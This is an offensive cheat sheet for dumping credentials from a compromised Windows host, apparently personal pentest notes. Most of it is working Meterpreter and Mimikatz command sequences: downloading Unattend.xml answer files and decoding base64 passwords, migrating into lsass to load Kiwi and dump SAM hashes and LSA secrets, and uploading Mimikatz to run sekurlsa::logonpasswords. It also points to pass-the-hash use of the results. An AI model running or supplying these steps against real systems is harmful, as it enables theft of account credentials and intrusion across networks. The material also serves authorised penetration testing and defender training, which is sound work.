# Windows Credential Dumping

Three ways to pull credentials off a compromised Windows host once you have
enough access, roughly in order of "how likely am I to find something usable."

All addresses/paths/values are placeholders. See [pass-the-hash.md](pass-the-hash.md)
for what to do with the NTLM hashes this produces.

## 1. Passwords in config files (Unattend.xml)

Unattended-install answer files can contain local admin credentials, sometimes
in plaintext, sometimes base64-encoded.

Typical locations:

- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattended.xml`
- `C:\Windows\System32\Sysprep\sysprep.xml` / `sysprep.inf`

```bash
meterpreter > search -f Unattend.xml
meterpreter > cd C:\Windows\Panther
meterpreter > download Unattend.xml

# on attacker box
grep -i password Unattend.xml
echo "<base64_value>" | base64 -d
```

## 2. Kiwi (Mimikatz inside Meterpreter)

Kiwi needs to be running in a SYSTEM-level process to read LSA secrets, so
migrate into `lsass.exe` first.

```bash
meterpreter > pgrep lsass
meterpreter > migrate <lsass_pid>
meterpreter > getuid                # NT AUTHORITY\SYSTEM

meterpreter > load kiwi
meterpreter > creds_all             # everything at once
meterpreter > lsa_dump_sam          # SAM → NTLM hashes
meterpreter > lsa_dump_secrets      # LSA secrets, occasionally cleartext
meterpreter > hashdump              # built-in meterpreter alternative
```

## 3. Standalone Mimikatz

```bash
meterpreter > cd C:\Temp
meterpreter > upload mimikatz.exe
meterpreter > shell

C:\Temp> .\mimikatz.exe
mimikatz # privilege::debug
# must return: Privilege '20' OK — otherwise you don't have SYSTEM/SeDebugPrivilege
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # sekurlsa::logonpasswords
```

## Notes

- The mimikatz command is `sekurlsa::logonpasswords` — not `sekurlsa::passwords`.
- `sekurlsa::logonpasswords` only yields cleartext when WDigest is enabled in
  memory — common by default on older Windows 7/Server 2008, disabled by
  default on Windows 8.1/Server 2012 R2 and later.
- Migrating into `lsass.exe` (or otherwise having SYSTEM) is a hard
  prerequisite for Kiwi/Mimikatz — without it, dump commands fail with an
  access-denied error.
- `search -f Unattend.xml` — the extension is `.xml`, easy to typo.
